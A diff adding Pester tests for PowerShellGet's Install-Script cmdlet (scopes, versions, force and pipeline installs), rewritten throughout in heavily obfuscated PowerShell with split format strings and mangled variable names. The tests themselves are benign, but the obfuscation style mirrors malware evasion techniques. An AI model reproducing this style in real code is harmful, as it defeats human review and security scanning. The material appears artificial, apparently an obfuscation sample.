+        &("{1}{0}"-f 'sert','As') ((-not ${M`yE`Rror}) -or -not (${myE`RROR} | &('?') { -not ((${_}."mES`SA`Ge" -match ("{1}{2}{3}{7}{6}{4}{5}{8}{0}" -f'on','StopUpstr','e','a','E','x','s','mCommand','cepti')) -or (${_}."MeSSa`gE" -eq ("{0}{1}{2}"-f'System ','er','ror.'))) }))  ('There'+' '+'sho'+'uld'+' '+'not'+' '+'be'+' '+'any'+' '+'e'+'r'+'ror '+'from'+' '+'seco'+'nd'+' '+'inst'+'al'+'l '+'wi'+'th '+'min'+' '+'ver'+'si'+'on, '+"$MyError")
+    } `
+        -Skip:$(${P`sCuLt`URe} -ne ("{1}{0}"-f '-US','en'))
+
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{0}{1}{3}{2}{4}" -f 'a','ll','p','Scri','tWithForce','Inst') {
+        ${sCr`Ip`Tn`AmE} = ("{3}{1}{2}{0}{4}" -f'rSc','e','rve','Fabrikam-S','ript')
+        &("{1}{2}{0}" -f 'cript','Instal','l-S') ${ScRIPT`N`A`me} -RequiredVersion 1.0
+        ${myEr`ROR} = ${N`Ull}
+        &("{0}{3}{2}{1}"-f 'I','-Script','ll','nsta') ${s`cRI`pTNamE} -RequiredVersion 1.5 -Force -ErrorVariable ("{0}{2}{1}" -f 'My','r','Erro')
+        &("{0}{1}"-f'As','sert') (${mye`Rror}."CO`Unt" -eq 0) ('The'+'re'+' '+'sh'+'ould '+'no'+'t '+'b'+'e '+'an'+'y '+'error'+' '+'fr'+'om '+'f'+'orc'+'e '+'inst'+'al'+'l, '+"$MyError")
+
+        ${R`eS} = &("{1}{3}{2}{4}{0}"-f 'ledScript','G','-Inst','et','al') ${scRip`Tn`AmE}
+        &("{0}{3}{2}{1}" -f 'As','quals','E','sert') ${R`ES}."N`AmE" ${S`c`RipT`NaME} ('Install-Sc'+'rip'+'t '+'wit'+'h '+'e'+'xistin'+'g '+'scr'+'ipt '+'shou'+'ld'+' '+'b'+'e '+'ove'+'rwrit'+'te'+'n '+'i'+'f '+'force'+' '+'is'+' '+'s'+'peci'+'fie'+'d, '+"$res")
+        &("{1}{0}{2}" -f 'q','AssertE','uals') ${R`es}."vers`ION" '1.5' ('I'+'nst'+'al'+'l-Script '+'wi'+'th '+'exi'+'s'+'ting '+'scrip'+'t '+'shou'+'ld'+' '+'be'+' '+'ove'+'rwr'+'i'+'tten '+'if'+' '+'fo'+'rc'+'e '+'i'+'s '+'spec'+'ifi'+'ed, '+"$res")
+    }
+
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{7}{0}{5}{9}{4}{3}{2}{6}{1}{8}" -f 'nstal','Fo','Wit','sion','SameVer','lS','h','I','rce','cript') {
+        ${SC`R`ipTnA`Me} = ("{4}{2}{1}{0}{3}"-f'er','S','-','verScript','Fabrikam')
+        ${veRSI`on} = '1.5'
+        &("{0}{1}{2}"-f 'Ins','tal','l-Script') ${SC`RIp`TnamE} -RequiredVersion ${VerSi`on}
+        ${m`yeR`ROR} = ${n`ULL}
+        &("{2}{1}{0}{3}"-f 'crip','S','Install-','t') ${SC`R`ip`TnAmE} -RequiredVersion ${V`ErsiON} -Force -ErrorVariable ("{0}{1}" -f 'MyErr','or')
+        &("{0}{1}{2}"-f 'As','se','rt') (${MyER`R`oR}."c`oUnT" -eq 0) ('Th'+'ere '+'sho'+'uld '+'no'+'t '+'be'+' '+'an'+'y '+'error'+' '+'f'+'rom '+'fo'+'rc'+'e '+'instal'+'l, '+"$MyError")
+        ${r`eS} = &("{0}{3}{5}{1}{2}{4}"-f 'Ge','lle','dScri','t','pt','-Insta') ${sCr`IpT`Name}
+        &("{0}{2}{1}"-f'As','als','sertEqu') ${R`ES}."N`AME" ${s`cRIpTnA`me} ('Ins'+'ta'+'l'+'l-Script'+' '+'with'+' '+'exis'+'tin'+'g'+' '+'sc'+'ri'+'pt '+'ver'+'si'+'on '+'shoul'+'d'+' '+'be'+' '+'overwr'+'it'+'ten'+' '+'if'+' '+'f'+'o'+'rce '+'i'+'s '+'specif'+'ie'+'d, '+"$res")
+        &("{0}{1}{2}"-f'A','ssertE','quals') ${R`eS}."v`erSIoN" '1.5' ('I'+'nsta'+'ll-Script'+' '+'wi'+'th '+'ex'+'isting'+' '+'s'+'c'+'ript '+'sho'+'uld'+' '+'b'+'e '+'o'+'v'+'erwrit'+'ten '+'if'+' '+'fo'+'rce '+'i'+'s '+'spe'+'cified'+', '+"$res")
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{8}{7}{6}{4}{5}{0}{1}{2}{3}"-f 'otAvai','lableMi','nVersio','n','i','ptWithN','r','lSc','Instal') {
+
+        ${Ex`pe`CT`eDFULlYqU`A`lIfIEdER`RO`R`ID} = ("{12}{4}{16}{13}{14}{1}{15}{17}{10}{18}{0}{8}{3}{19}{7}{6}{2}{9}{11}{5}"-f'PowerShell.Pack',',M','ets.Insta','geManag','c','ckage','mdl','ment.C','a','l','o','lPa','NoMat','undF','orCriteria','icro','hFo','s','ft.','e')
+
+        &("{3}{8}{0}{6}{1}{5}{7}{2}{4}" -f 'lyQ','ali','l','Asser','s','fiedError','u','IdEqua','tFul') -scriptblock { &("{2}{1}{0}{4}{3}"-f 'cr','tall-S','Ins','t','ip') ("{4}{3}{1}{5}{0}{2}"-f 'r','-Serve','ipt','brikam','Fa','rSc') -MinimumVersion 10.0 } `
+            -expectedFullyQualifiedErrorId ${EXP`EcTEdfUl`ly`qUALI`F`I`ederroRiD}
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{6}{2}{5}{3}{8}{9}{7}{1}{11}{10}{4}" -f'In','V','ptWithNo','b','n','tAvaila','stallScri','q','le','Re','io','ers') {
+
+        ${E`XPECT`ed`FuLlYquaLI`FIe`D`ErrOrID} = ("{7}{14}{8}{3}{2}{4}{1}{11}{9}{0}{5}{6}{16}{15}{10}{12}{13}"-f 'Packa','o','Microsoft.','ia,','P','geM','anagement.','NoMatchF','ForCriter','Shell.','n','wer','stal','lPackage','ound','dlets.I','Cm')
+
+        &("{3}{1}{2}{0}{5}{4}"-f'I','ss','ertFullyQualifiedError','A','s','dEqual') -scriptblock { &("{0}{1}{2}{3}" -f 'Inst','all-Scr','i','pt') ("{0}{1}{2}{4}{3}{5}"-f'F','abrika','m-Se','verScri','r','pt') -RequiredVersion 1.44 } `
+            -expectedFullyQualifiedErrorId ${E`xp`ecT`edF`ULLyQU`A`Lif`ieDERR`ORiD}
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{3}{5}{7}{2}{1}{0}{6}" -f'rsi','eqVe','thR','n','I','stallScri','on','ptWi') {
+        ${sCRipt`NA`Me} = ("{4}{0}{1}{3}{2}" -f 'ab','rik','rverScript','am-Se','F')
+        ${Vers`I`On} = '1.5'
+        &("{3}{0}{2}{1}" -f'nstall-S','pt','cri','I') ${scrIpT`N`Ame} -RequiredVersion ${veRs`IOn} -Confirm:${fA`LSE}
+        ${r`es} = &("{2}{1}{0}{3}" -f 'edS','stall','Get-In','cript') ${S`CR`IPTN`AmE}
+        &("{3}{0}{1}{2}"-f 'ss','er','tEquals','A') ${r`Es}."N`Ame" ${S`crIPT`Name} ("{14}{6}{12}{7}{15}{0}{10}{13}{1}{3}{4}{8}{2}{5}{11}{9}"-f 'ed','sta','eq','ll ','wit','uire','all-','p','h R','ion',' to','dVers','Scri',' in','Inst','t fail')
+        &("{2}{3}{1}{0}"-f'ls','a','Asser','tEqu') ${r`es}."ve`R`SION" ${ve`RsI`on} ("{7}{5}{0}{8}{2}{4}{3}{6}{1}"-f'ript fail','rsion','d t','stall with ','o in','Sc','RequiredVe','Install-','e')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{0}{4}{2}{3}" -f 'ptWith','InstallScri','er','sion','MinV') {
+        ${ScRI`Ptna`mE} = ("{1}{3}{0}{4}{2}" -f'c','Fabrikam-S','t','erverS','rip')
+        ${VErs`I`on} = '1.5'
+        &("{3}{1}{2}{0}"-f'l-Script','t','al','Ins') ${sc`Ri`Pt`NaMe} -MinimumVersion ${v`ER`SiON}
+        ${R`ES} = &("{0}{3}{1}{2}" -f'Ge','ledSc','ript','t-Instal') ${sc`RIp`T`NamE}
+        &("{1}{0}{2}"-f'Equa','Assert','ls') ${r`ES}."n`AME" ${scR`IPTNa`ME} ("{1}{7}{8}{13}{12}{11}{5}{0}{6}{10}{4}{3}{2}{9}"-f 'h M','In','i','mVers','u','t','ini','stall-Sc','ript f','on','m','stall wi','ed to in','ail')
+        &("{0}{2}{1}" -f 'A','ert','ss') (${r`ES}."VE`RS`IOn" -ge ${V`ERsion}) ("{7}{0}{5}{6}{8}{9}{4}{2}{3}{1}"-f'-Script fai','n','e','rsio','umV','led to ins','tall ','Install','with Mi','nim')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{0}{1}{3}{4}{6}{2}" -f 'nsta','llN','cript','o','tAva','I','ilableS') {
+
+        ${e`xPECtEDF`ULL`y`QUaLIFIederroRid} = ("{2}{4}{7}{13}{3}{11}{12}{1}{10}{8}{5}{9}{0}{6}" -f'c','.Pac','No','r','MatchFound','n','kage','F','Cmdlets.I','stallPa','kageManagement.','iteria,Microsoft.PowerShe','ll','orC')
+
+        &("{1}{6}{3}{8}{9}{7}{5}{2}{0}{4}{10}" -f 'E','A','rrorId','e','qua','iedE','ss','if','r','tFullyQual','ls') -scriptblock { &("{0}{2}{3}{1}"-f 'Inst','ript','all-','Sc') ("{2}{4}{3}{1}{0}"-f'ipt','cr','N','stentS','onExi') } `
+            -expectedFullyQualifiedErrorId ${eXpeCteD`F`U`L`L`YQUAL`IFIE`derROrID}
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{2}{0}{3}{4}" -f 'allScriptWithPipelin','I','nst','eInpu','t') {
+        ${scRI`pt`N`AME} = ("{4}{2}{3}{1}{0}" -f'ipt','rverScr','br','ikam-Se','Fa')
+        &("{0}{1}{2}"-f 'Find-','Scrip','t') ${sCR`ip`T`NaMe} | &("{2}{0}{1}{3}{4}" -f 'nst','a','I','ll-Scri','pt')
+        ${R`ES} = &("{3}{0}{4}{1}{5}{2}" -f'-In','lledSc','ipt','Get','sta','r') ${SCr`iPtN`AmE}
+        &("{2}{0}{1}"-f'ertEqu','als','Ass') ${r`ES}."na`ME" ${Sc`RIp`TnAme} ("{10}{11}{9}{6}{1}{12}{4}{5}{2}{7}{3}{0}{8}{13}"-f 'ipel','iled','brik','Script with p','o in','stall Fa','a','am-Server','ine ','pt f','In','stall-Scri',' t','input')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{4}{2}{11}{3}{6}{1}{10}{9}{7}{8}{0}"-f't','c','tall','ultiple','ns','I','S','peline','Inpu','tsWithPi','rip','M') {
+        &("{1}{3}{2}{0}"-f'ript','Fin','c','d-S') ("{2}{3}{0}{4}{5}{6}{1}" -f'br','t','F','a','ikam-','ClientScri','p'), ("{0}{2}{4}{3}{1}" -f'Fabrikam','cript','-','rverS','Se') | &("{0}{3}{2}{1}"-f'Install-','t','rip','Sc')
+        ${r`Es} = &("{0}{2}{1}{3}" -f 'Get-Insta','ledScri','l','pt') ("{2}{3}{4}{1}{0}" -f'ntScript','lie','Fa','b','rikam-C'), ("{0}{5}{2}{1}{4}{3}" -f 'F','-S','ikam','t','erverScrip','abr')
+        &("{0}{1}"-f 'Ass','ert') (${r`es}."c`OuNt" -eq 2) ("{15}{6}{5}{3}{14}{9}{0}{8}{4}{1}{13}{10}{11}{7}{12}{2}"-f 'all mult','scr','t','t failed','ple ','-Scrip','stall','om Fin','i','t','p','ts fr','d-Script outpu','i',' to ins','In')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{5}{6}{1}{3}{7}{9}{8}{4}{2}" -f 'Inst','tip','am','le','ar','allM','ul','ScriptsU','tObjectP','singInpu') {
+        ${I`TEms} = &("{3}{2}{1}{0}" -f 't','ip','nd-Scr','Fi') ("{6}{5}{2}{4}{0}{3}{1}" -f 'S','pt','m-','cri','Client','a','Fabrik'), ("{0}{4}{3}{2}{1}{6}{5}"-f'Fa','rScr','rve','Se','brikam-','t','ip')
+        &("{1}{0}{2}" -f 'Sc','Install-','ript') -InputObject ${it`E`ms}
+        ${R`Es} = &("{6}{3}{2}{1}{5}{0}{4}"-f'edScri','ta','t-Ins','e','pt','ll','G') ("{5}{1}{4}{6}{0}{3}{2}"-f'S','abrika','ript','c','m-C','F','lient'), ("{2}{1}{0}{4}{3}" -f'-ServerS','ikam','Fabr','ipt','cr')
+        &("{1}{0}"-f't','Asser') (${r`ES}."cOU`Nt" -eq 2) ("{11}{10}{5}{2}{4}{3}{8}{13}{1}{7}{6}{14}{0}{15}{9}{12}" -f 't p','all multiple s','all-','fail','Script ','st','tOb','cripts with -Inpu','ed to ins','me','n','I','ter','t','jec','ara')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{2}{6}{9}{11}{10}{0}{8}{1}{5}{7}{3}{4}"-f's','WithP','Inst','neIn','put','ipel','allT','i','ersScope','o','lU','Al') {
+        ${Scr`Ip`T`NAmE} = ("{4}{1}{5}{6}{2}{3}{0}" -f 't','br','v','erScrip','Fa','ikam','-Ser')
+        &("{0}{1}{2}" -f 'Find-','Scrip','t') ${sCri`P`Tn`AMe} | &("{2}{1}{0}" -f't','ip','Install-Scr') -Scope ("{1}{2}{0}" -f's','A','llUser')
+        ${R`es} = &("{3}{0}{2}{4}{1}" -f't-Inst','t','alledScri','Ge','p') ${SCRi`PTn`A`me}
+        &("{0}{1}{2}{3}"-f'A','sse','rtE','quals') ${r`es}."I`N`st`AlLeDL`o`CatIoN" ${sCRi`PT:PROg`RAMFIleSs`C`Ript`spaTh} ('I'+'nstall-Scr'+'ipt'+' '+'wi'+'th '+'Al'+'lUse'+'r'+'s '+'scop'+'e '+'d'+'id '+'no'+'t '+'i'+'nsta'+'ll '+'Fab'+'rikam-Se'+'rv'+'e'+'rS'+'cript'+' '+'to'+' '+'pro'+'g'+'ram '+'fil'+'es '+'scr'+'ip'+'ts '+'fol'+'der, '+"$script:ProgramFilesScriptsPath")
+
+        if (${Is`w`indows} -ne ${FaL`SE}) {
+            ${C`MdInfO} = &("{0}{2}{1}" -f'Get-Comma','d','n') -Name ${S`cRIp`TnAme}
+            &("{2}{0}{1}" -f'l','l','AssertNotNu') ${C`mD`iNFo} ("{7}{6}{0}{19}{10}{4}{3}{8}{23}{11}{5}{12}{15}{16}{1}{18}{2}{9}{20}{22}{14}{13}{21}{17}" -f 's','d','y ','he','d to t','c','ript in','Sc',' c','t','le','er s','o','a','t-Comm','pe i','s not foun','d cmdlet',' b','tal','he','n',' Ge','urrent us')
+            &("{2}{1}{0}" -f 'uals','ssertEq','A') ${c`mDiN`Fo}."nA`ME" "$scriptName.ps1" ('S'+'cr'+'ipt '+'ins'+'ta'+'lled '+'to'+' '+'th'+'e '+'curr'+'ent '+'u'+'ser '+'sc'+'ope '+'i'+'s '+'not'+' '+'fo'+'u'+'nd '+'b'+'y '+'the'+' '+'Get-Co'+'mma'+'nd '+'cmdlet'+','+' '+"$cmdlInfo")
+
+            
+            if (${psv`e`RS`ioNTaB`lE}."Psv`ersi`oN" -ge ("{0}{1}" -f '5','.0.0')) {
+                &("{3}{1}{2}{0}" -f 'ertEquals','s','s','A') ${cMD`i`NFo}."sOUR`CE" "$($res.InstalledLocation)\$scriptName.ps1" "Script installed to the current user scope is not found by the Get-Command cmdlet, $($cmdlInfo.Source) "
+            }
+        }
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{3}{0}{2}{1}{5}{6}{4}"-f 'ta','ur','llToC','Ins','cope','rentUse','rS') {
+        ${S`Cri`PtNA`mE} = ("{1}{2}{3}{0}" -f't','Fa','brikam-ServerScr','ip')
+        &("{1}{0}{2}"-f 'nstall-Scri','I','pt') ${s`C`RIpTN`AMe} -Scope ("{2}{0}{1}"-f 'rr','entUser','Cu')
+        ${r`ES} = &("{5}{1}{0}{6}{4}{2}{3}"-f '-','t','alled','Script','t','Ge','Ins') ${ScRIPt`N`A`mE}
+        &("{2}{1}{0}"-f 'ls','ua','AssertEq') ${R`es}."InSt`ALlE`D`LOCA`Tion" ${ScRI`PT:`MYdoCU`men`Ts`sCr`IptSpATh} ('In'+'stall'+'-S'+'cr'+'ipt '+'w'+'ith '+'C'+'urrentU'+'s'+'er '+'scope'+' '+'did'+' '+'no'+'t '+'in'+'stal'+'l '+'Fabrikam'+'-Se'+'rv'+'er'+'Scri'+'p'+'t '+'t'+'o '+'user'+' '+'d'+'ocu'+'ments '+'f'+'older'+', '+"$script:MyDocumentsScriptsPath")
+        if (${Isw`i`NDoWS} -ne ${FA`lSE}) {
+            ${c`MdI`Nfo} = &("{2}{1}{0}" -f'mand','-Com','Get') -Name ${scrI`PTn`AME}
+            &("{3}{1}{0}{2}"-f'ertNot','ss','Null','A') ${cMDi`N`Fo} ("{8}{13}{16}{12}{17}{0}{7}{11}{6}{14}{15}{5}{1}{10}{2}{9}{3}{4}"-f 't','et-','and','dl','et','y the G',' scope is n','he curren','Scrip',' cm','Comm','t user','t','t','ot fo','und b',' installed ','o ')
+            &("{2}{0}{3}{1}" -f'qua','s','AssertE','l') ${CMDIn`Fo}."n`AME" "$scriptName.ps1" ('Script'+' '+'ins'+'t'+'alled '+'t'+'o '+'the'+' '+'curren'+'t '+'us'+'er '+'scop'+'e '+'is'+' '+'not'+' '+'f'+'ou'+'nd '+'by'+' '+'the'+' '+'Ge'+'t'+'-Com'+'mand '+'cmd'+'let'+', '+"$cmdlInfo")
+
+            
+            if (${psv`Er`s`IOntA`BLe}."PS`VE`R`sioN" -ge ("{0}{1}" -f'5','.0.0')) {
+                &("{1}{0}{3}{2}"-f'se','As','als','rtEqu') ${C`Mdinfo}."SOU`R`cE" "$($res.InstalledLocation)\$scriptName.ps1" "Script installed to the current user scope is not found by the Get-Command cmdlet, $($cmdlInfo.Source) "
+            }
+        }
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{2}{9}{0}{1}{4}{3}{7}{5}{6}{10}{8}" -f 'cr','iptW','I','h','it','An','dDiff','Force','ope','nstallS','erentSc') {
+        ${S`CripT`Na`ME} = ("{2}{1}{3}{0}{4}"-f 'Scri','m-','Fabrika','Server','pt')
+        &("{0}{2}{4}{3}{1}"-f'In','t','stal','Scrip','l-') ${sCRi`PT`NA`Me} -Scope ("{2}{3}{0}{1}" -f 'Us','er','Curr','ent')
+        ${Re`s1} = &("{1}{2}{0}{3}{4}" -f'ledS','G','et-Instal','c','ript') ${sC`Riptn`A`ME}
+        &("{1}{0}{2}{3}"-f'ssertEq','A','ual','s') ${re`S1}."InstalLED`Lo`CAtI`on" ${scr`IpT:myD`o`CU`mEnT`SS`c`R`IPTspa`TH} ('Ins'+'ta'+'ll-S'+'cript'+' '+'wi'+'th '+'Current'+'User'+' '+'sco'+'pe'+' '+'did'+' '+'no'+'t '+'in'+'s'+'tall '+'Fa'+'br'+'ikam-Se'+'rv'+'erScrip'+'t'+' '+'t'+'o '+'us'+'er '+'d'+'ocum'+'e'+'nts '+'folder,'+' '+"$script:MyDocumentsScriptsPath")
+
+        &("{2}{1}{0}{3}"-f 'll-Scri','ta','Ins','pt') ${Sc`R`iPt`NAMe} -Scope ("{1}{0}{2}" -f 'lUse','Al','rs') -Force
+        ${r`eS2} = &("{5}{3}{1}{2}{4}{0}" -f'pt','t','a','-Ins','lledScri','Get') ${Sc`Ri`PtName}
+
+        &("{0}{2}{1}" -f 'As','rtEquals','se') ${RE`s2}."NA`mE" ${sCRip`T`NamE} ('Only'+' '+'one'+' '+'scr'+'i'+'pt '+'sho'+'u'+'ld '+'be'+' '+'av'+'a'+'ilable '+'a'+'ft'+'er '+'c'+'hangin'+'g '+'t'+'he '+'-'+'Scope '+'wit'+'h '+'-For'+'c'+'e '+'on'+' '+'In'+'stall-Scr'+'i'+'pt '+'cmd'+'le'+'t, '+"$res2")
+        &("{3}{0}{1}{2}"-f 'sser','tEq','uals','A') ${r`ES2}."INsTAll`EDl`O`CA`TioN" ${scri`PT:PrOgraMfILeS`sC`RI`Ptsp`AtH} ('Instal'+'l-'+'S'+'cript '+'w'+'ith '+'AllUs'+'ers'+' '+'sc'+'o'+'pe '+'and'+' '+'-Fo'+'r'+'ce '+'di'+'d '+'no'+'t '+'i'+'n'+'stall '+'F'+'abr'+'i'+'kam-Se'+'r'+'verScr'+'ipt '+'to'+' '+'progra'+'m '+'fil'+'es '+'s'+'cr'+'ipts '+'f'+'older'+', '+"$res2")
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{3}{1}{9}{2}{0}{7}{11}{6}{5}{8}{12}{4}{10}" -f'ser','tal','tWithAllU','Ins','rNonAdmin','opePa','c','s','ramet','lScrip','User','S','erFo') {
+        ${N`OnAdMIn`C`o`NSOlEoU`T`put} = &("{0}{1}"-f 'Join-Pat','h') ( ( GEt-cHilDITEm ("vaR"+"Iabl"+"e"+":Z7yW") )."VAL`Ue"::("{0}{2}{1}"-f'Ge','ath','tTempP').Invoke()) ("{1}{4}{0}{3}{2}" -f'-out','nonadm','t','.tx','inconsole')
+
+        ${PS`pRoCe`Ss} = ("{2}{0}{1}"-f'rShell.ex','e','Powe')
+        if (${SCRiP`T:IsC`OR`Ec`lR}) {
+            ${P`S`pROceSS} = ("{0}{1}"-f'pwsh','.exe')
+        }
+
+        &("{0}{1}{2}" -f'Sta','rt-Proce','ss') ${P`sp`Ro`cesS} -ArgumentList '-command if(-not (Get-PSRepository -Name PoshTest -ErrorAction SilentlyContinue)) {
+                                                    Register-PSRepository -Name PoshTest -SourceLocation https://www.poshtestgallery.com/api/v2/ -InstallationPolicy Trusted
+                                                }
+                                                Install-Script -Name Fabrikam-Script -NoPathUpdate -Scope AllUsers -ErrorVariable ev -ErrorAction SilentlyContinue;
+                                                Write-Output "$ev"' `
+            -Credential ${sCri`pT`:CreD`eNTiAL} `
+            -Wait `
+            -WorkingDirectory ${PS`H`OmE} `
+            -RedirectStandardOutput ${noN`AdmINC`On`so`LEouTp`UT}
+
+        &("{1}{0}"-f 'r','waitFo') { &("{2}{1}{0}" -f'Path','t-','Tes') ${n`OnAD`mINCO`NSOlE`outP`UT} } -timeoutInMilliseconds ${SCrIpT:aSsE`RTTI`m`eo`UTms} -exceptionMessage ("{7}{0}{3}{4}{11}{9}{2}{6}{1}{8}{12}{5}{10}"-f'-S','i','consol','cript o','n n','complet','e fa','Install','l','n-admin ','e','o','ed to ')
+        ${cO`NtE`NT} = &("{0}{2}{1}{3}"-f'G','-Conten','et','t') ${NONaDMINc`O`Ns`o`l`eOutpuT}
+        &("{1}{0}{2}{3}"-f'move','Re','It','em') ${N`OnADm`iNCONSoL`EOut`PuT}
+
+        &("{2}{3}{0}{1}"-f'NotNul','l','A','ssert') (${c`O`NTenT}) ("{2}{9}{1}{14}{12}{15}{6}{17}{11}{4}{5}{16}{18}{13}{10}{7}{0}{8}{3}"-f't','Scri','Install','ceed','sco','p','th All',' no',' suc','-','ole should','sers ','t w','user cons','p','i','e o','U','n non-admin ')
+        &("{2}{1}{0}"-f'rt','se','As') (${c`O`NTeNT} -match ("{3}{7}{6}{4}{5}{1}{0}{2}"-f'insta','quired to ','ll','Adm',' ','are re','ghts','inistrator ri') ) ('I'+'nstal'+'l '+'scrip'+'t '+'wit'+'h '+'A'+'llUsers '+'scope'+' '+'on'+' '+'n'+'on-a'+'dmin'+' '+'use'+'r '+'c'+'onso'+'le '+'s'+'h'+'ould '+'fai'+'l,'+' '+"$content")
+    } `
+        -Skip:$(
+        ${WHO`A`MIv`AlUE} = (&("{0}{1}"-f'whoam','i'))
+
+        (${wh`OA`M`IVALUe} -eq ((("{3}{1}{0}{2}"-f'R','THO','ITY{0}SYSTEM','NT AU'))-f  [ChAr]92)) -or
+        (${w`Ho`Amivalue} -eq ((("{2}{1}{3}{0}{7}{5}{4}{6}"-f 'ORITY','T AUT','N','H','S','AL ','ERVICE','CDbLOC'))."REPL`A`CE"('CDb',[StriNG][cHaR]92))) -or
+        (${w`Ho`Am`IvaluE} -eq ((("{3}{6}{7}{0}{2}{5}{4}{1}"-f'TYhEGNETWORK S','CE','E','NT ','VI','R','AUT','HORI')) -CRepLaCE 'hEG',[chaR]92)) -or
+        (${p`sveRsi`oN`TablE}."PsVersI`On" -lt ("{1}{0}" -f'.0.0','4')) -or
+        (-not ${ScRIpT`:I`swI`Ndo`Ws`Os}) -or
+        
+        (${sc`RI`pT:`isC`Oreclr})
+    )
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{8}{9}{11}{0}{7}{10}{12}{6}{4}{1}{5}{3}{2}"-f'riptD','rNonAd','nUser','i','copeParameterFo','m','serS','ef','In','stall','a','Sc','ultU') {
+        ${NOnadMi`NCo`N`soLEOutP`UT} = &("{0}{1}{2}"-f 'Jo','in-','Path') ( (  GET-varIaBlE  ("Z"+"7Yw") )."Va`LUe"::("{1}{0}{2}"-f 't','GetTempPa','h').Invoke()) ("{0}{5}{2}{1}{6}{4}{3}"-f'nonad','onsol','nc','.txt','-out','mi','e')
+
+        ${ps`P`RoCESs} = ("{1}{4}{2}{3}{0}" -f 'xe','Powe','Shel','l.e','r')
+        if (${S`CRIp`T:`is`cORe`CLr}) {
+            ${p`spR`o`cess} = ("{1}{0}"-f 'wsh.exe','p')
+        }
+
+        &("{0}{1}{2}"-f'S','ta','rt-Process') ${p`sPR`oCesS} -ArgumentList ((("{4}{30}{17}{26}{28}{11}{34}{32}{39}{21}{12}{22}{18}{29}{42}{20}{37}{40}{13}{35}{23}{16}{25}{7}{0}{33}{10}{1}{41}{36}{31}{14}{3}{24}{9}{6}{5}{2}{38}{8}{15}{27}{19}{43}" -f '   ','ript Fabri','In','F','-co','ame, ','mat-List N',' ','l','r','t-InstalledSc','cript ','Scri','      ','eoE ','e','       ','l','t -NoPathUpdate;
+','Locatio','  ','r','p',' ','o','    ','-','d','S','  ','mmand Instal','Script ',' F','          Ge','-Name','  ','-Server','     ','stal','abrikam-Serve','   ','kam','  ','n'))."Rep`lAce"('eoE',[StRIng][Char]124)) `
+            -Credential ${sc`RIP`T:`creDENtI`AL} `
+            -Wait `
+            -WorkingDirectory ${p`sh`OME} `
+            -RedirectStandardOutput ${NONAdMinC`O`N`sO`l`eOUt`PuT}
+
+        &("{1}{0}{2}"-f'F','wait','or') { &("{0}{1}"-f'Te','st-Path') ${nO`NA`DMinCo`NS`ole`ouTpUT} } -timeoutInMilliseconds ${Sc`Ript`:A`SsErttImEO`UTMS} -exceptionMessage ("{6}{3}{2}{15}{9}{4}{0}{1}{5}{8}{12}{16}{11}{10}{7}{13}{14}" -f 'on',' non-','a','t','ipt ','a','Ins','o','d','Scr','o c','t','min ','mpl','ete','ll-','console failed ')
+        ${C`On`TENt} = &("{1}{2}{3}{0}"-f'tent','G','et-C','on') ${n`OnAdMin`con`SOLE`O`UT`pUt}
+        &("{1}{0}{2}{3}" -f'mo','Re','veI','tem') ${NO`N`AdMI`Nc`oNS`OLe`ouTPUt}
+
+        &("{3}{4}{0}{2}{1}" -f 'NotN','ll','u','Ass','ert') (${CON`TEnT}) ("{19}{17}{10}{5}{14}{11}{12}{6}{18}{8}{3}{13}{9}{15}{16}{2}{4}{7}{1}{0}" -f'ed','ce','ld',' on non',' s','Scri','t user sco','uc','e','in user console sh','ll-','u','lt curren','-adm','pt with defa','o','u','ta','p','Ins')
+        &("{1}{0}{2}"-f'se','As','rt') (${CoN`T`EnT} -match ("{3}{0}{4}{5}{1}{2}" -f 'br','ver','Script','Fa','ikam','-Ser')) ("{9}{6}{4}{0}{3}{1}{8}{7}{5}{2}" -f 'i','ot ins','y','d n','d','ectl','t ','r','tall cor','Scrip')
+        &("{1}{0}"-f'ert','Ass') (${c`O`NteNt} -match ("{0}{2}{1}"-f'D','ts','ocumen')) ("{4}{0}{2}{6}{8}{1}{7}{5}{3}"-f'did not','t',' ','tion','Script ',' correct loca','i','he','nstall to ')
+    } `
+        -Skip:$(
+        ${W`Hoamiva`l`UE} = (&("{0}{1}{2}"-f'w','ho','ami'))
+
+        (${WH`oAM`i`VaLUe} -eq ((("{4}{3}{1}{0}{5}{2}"-f 'Ywx','IT','YSTEM','HOR','NT AUT','WS'))."r`eplACe"(([cHAr]119+[cHAr]120+[cHAr]87),'\'))) -or
+        (${Whoa`mIV`A`Lue} -eq ((("{2}{3}{0}{1}{4}"-f 'LOCAL ','SERVIC','NT AUTHORITYZ2','p','E')).("{2}{1}{0}" -f 'E','PLaC','Re').Invoke('Z2p','\'))) -or
+        (${WhOa`MIVa`l`Ue} -eq ((("{2}{0}{3}{1}{4}" -f'9','TWORK SE','NT AUTHORITYW','tNE','RVICE'))  -cREpLAcE'W9t',[ChAr]92)) -or
+        (${p`SvErS`IoN`Table}."p`Sv`ERsIOn" -lt ("{1}{0}"-f '.0','4.0')) -or
+        (-not ${S`cr`ipt:iswi`NDow`sos}) -or
+        
+        (${sCrI`pT:I`sC`oREC`Lr})
+    )
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{11}{12}{16}{2}{3}{7}{9}{10}{1}{14}{0}{8}{5}{4}{15}{6}{17}{13}" -f 'mp','oThe','l','lUse','g','rAddin','ATHVariab','r','tFo','s','_NO_t','I','n','e','Pro','toP','stallScript_A','l') {
+        try {
+            
+            &("{2}{1}{3}{0}"-f'em','e','R','moveIt') -Path ${sCRip`T:PSGets`eT`Ti`N`GsfIle`PA`TH}
+
+            
